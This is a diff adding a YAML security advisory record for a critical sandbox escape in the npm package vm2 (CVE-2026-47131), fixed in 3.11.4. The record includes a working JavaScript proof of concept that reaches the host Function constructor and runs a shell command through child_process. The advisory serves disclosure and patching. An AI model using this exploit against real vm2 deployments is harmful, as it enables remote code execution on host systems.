@@ -1,0 +1,77 @@
+advisory_id: GHSA-v6mx-mf47-r5wg
+datasource_id: github_osv/GHSA-v6mx-mf47-r5wg
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-v6mx-mf47-r5wg/GHSA-v6mx-mf47-r5wg.json
+aliases:
+  - CVE-2026-47131
+summary: |
+  vm2 has a Sandbox Escape issue
+  ### Summary
+  By combining `Buffer.call.call({}.__lookupGetter__, Buffer, "__proto__")`, `Buffer.call.call({}.__lookupSetter__, Buffer, "__proto__")`, and Node.js's `ERR_INVALID_ARG_TYPE` Error, the host's `TypeError` constructor can be obtained, which allows the escape from the sandbox.
+  This allows attackers to run arbitrary code.
+
+  ### PoC
+  ```js
+  "use strict";
+
+  const { VM } = require("vm2");
+  const vm = new VM();
+
+  vm.run(`
+    "use strict";
+
+    const getProto = Buffer.call.call({}.__lookupGetter__, Buffer, "__proto__");
+    const setProto = Buffer.call.call({}.__lookupSetter__, Buffer, "__proto__");
+
+    async function f() {
+      try {
+        await WebAssembly.compileStreaming();
+      } catch(e) {
+        setProto.call(getProto.call(e), null);
+      }
+
+      try {
+        await WebAssembly.compileStreaming();
+      } catch(e) {
+        const HostFunction = e.constructor.constructor;
+        new HostFunction("return process")().mainModule.require("child_process").execSync("echo pwned", { stdio: "inherit" });
+      }
+    }
+
+    f();
+  `);
+  ```
+
+  ### Impact
+  Sandbox Escape → RCE
+impacted_packages:
+  - purl: pkg:npm/vm2
+    affected_versions: vers:npm/<=3.11.3
+    fixed_versions: vers:npm/3.11.4
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '10.0'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-v6mx-mf47-r5wg/GHSA-v6mx-mf47-r5wg.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-913
+references:
+  - url: https://github.com/patriksimek/vm2
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/commit/27c525f4615e2b983f122e2bed327d810126f5c8
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/releases/tag/v3.11.4
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/security/advisories/GHSA-v6mx-mf47-r5wg
+    reference_type:
+    reference_id:
